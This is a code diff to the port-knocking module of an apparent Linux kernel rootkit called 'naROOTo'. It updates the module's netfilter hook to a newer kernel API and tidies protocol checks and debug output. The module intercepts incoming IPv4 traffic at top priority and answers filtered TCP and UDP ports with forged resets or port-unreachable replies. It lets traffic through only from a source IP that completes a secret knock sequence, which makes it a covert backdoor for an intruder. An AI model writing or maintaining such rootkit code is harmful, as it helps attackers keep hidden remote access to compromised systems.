@@ -20,8 +20,8 @@
  * You should have received a copy of the GNU General Public License
  * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
  */
-
 #include <linux/inet.h>
+#include <linux/ip.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/skbuff.h>
@@ -61,7 +61,7 @@ is_port_blocked (struct sk_buff *skb) {
 	
 
 	/* check tree for TCP */
-	if (ip_header->protocol == 6) {
+	if (ip_header->protocol == IPPROTO_TCP) {
 
 		/* get the tcp header */
 		tcp_header = (struct tcphdr *) skb_transport_header(skb);
@@ -85,32 +85,29 @@ is_port_blocked (struct sk_buff *skb) {
 				}
 			}
 			
-			ROOTKIT_DEBUG("Packet detected on TCP Port %u. State is now %u.\n", port, tcp_state);
+			//ROOTKIT_DEBUG("Packet detected on TCP Port %u. State is now %u.\n",
+			//	port, tcp_state);
 		}
 		
 		/* check if the port matches */
 		if(is_knocked_tcp(port)) {
-			ROOTKIT_DEBUG("Received packet on filtered tcp port %u from IP %pI4.\n",
+			ROOTKIT_DEBUG("Received packet on filtered TCP port %u from IP %pI4.\n",
 				port, &ip_header->saddr);
 			
 			/* check if we are in the correct state */
 			if(tcp_state == 5 || ip_header->saddr == ipaddr) {
 				tcp_state = 0;	/* reset the state */
 				ipaddr = ip_header->saddr;
-				
 				return 0;	/* allow it */
-
 			} else {
-				
 				return 1;	/* reject it */
-
 			}
 			
 		}
 	}
 
 	/* check tree for UDP */
-	if (ip_header->protocol == 17) {
+	if (ip_header->protocol == IPPROTO_UDP) {
 
 		/* get the udp header */
 		udp_header = (struct udphdr *) skb_transport_header(skb);
@@ -133,46 +130,35 @@ is_port_blocked (struct sk_buff *skb) {
 					}
 				}
 			}
-			
-			ROOTKIT_DEBUG("Packet detected on UDP Port %u. State is now %u.\n", port, udp_state);
+			//ROOTKIT_DEBUG("Packet detected on UDP Port %u. State is now %u.\n",
+			//	port, udp_state);
 		}
 
 		/* check if the port matches */
 		if(is_knocked_udp(port)) {
-			ROOTKIT_DEBUG("Received packet on filtered udp port %u from IP %pI4.\n",
+			ROOTKIT_DEBUG("Received packet on filtered UDP port %u from IP %pI4.\n",
 				port, &ip_header->saddr);
 			
 			/* check if we are in the correct state */
 			if(udp_state == 5 || ip_header->saddr == ipaddr) {
 				udp_state = 0;	/* reset the state */
 				ipaddr = ip_header->saddr;
-				
 				return 0;	/* allow it */
-
 			} else {
-				
 				return 1;	/* reject it */
-
 			}
 			
 		}
 	}
-
 	return 0;	/* allow it */
 }
 
 /* 
  * The Netfilter hook function.
  * It is of type nf_hookfn (see netfilter.h).
- *
- * 
  */
 unsigned int
-knocking_hook (const struct nf_hook_ops *ops,
-	struct sk_buff *skb,
-	const struct net_device *in,
-	const struct net_device *out,
-	int (*okfn)(struct sk_buff *))
+knocking_hook (void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
 	struct iphdr *ip_header;
 	
@@ -183,12 +169,10 @@ knocking_hook (const struct nf_hook_ops *ops,
 		/* 
 		 * craft an appropriate REJECT response
 		 */
-		if(ip_header->protocol == 6) {	/* tcp */
-			nf_send_reset(skb, ops->hooknum);	/* send TCP RST */
-		}
-		
-		if(ip_header->protocol == 17) {	/* udp */
-			nf_send_unreach(skb, 3);		/* send icmp port unreachable */
+		if(ip_header->protocol == IPPROTO_TCP) {
+			nf_send_reset(state->net, skb, state->hook);	/* send TCP RST */
+		} else if(ip_header->protocol == IPPROTO_UDP) {
+			nf_send_unreach(skb, 3, state->hook);		/* send icmp port unreachable */
 		}
 
 		/* we can now safely drop the packet */
@@ -196,10 +180,8 @@ knocking_hook (const struct nf_hook_ops *ops,
 		return NF_DROP;
 
 	} else {
-
 		/* let the packet through */
 		return NF_ACCEPT;
-
 	}
 
 }
@@ -217,9 +199,9 @@ load_port_knocking (void)
 	ipaddr = 0;
 	
 	/* setup everything for the netfilter hook */
-	hook.hook = knocking_hook;			/* our function */
+	hook.hook = knocking_hook;		/* our function */
 	hook.hooknum = NF_INET_LOCAL_IN;	/* grab everything that comes in */
-	hook.pf = PF_INET; 					/* we only care about ipv4 */
+	hook.pf = PF_INET;			/* we only care about ipv4 */
 	hook.priority = NF_IP_PRI_FIRST;	/* respect my prioritah */
 
 	/* actually do the hook */
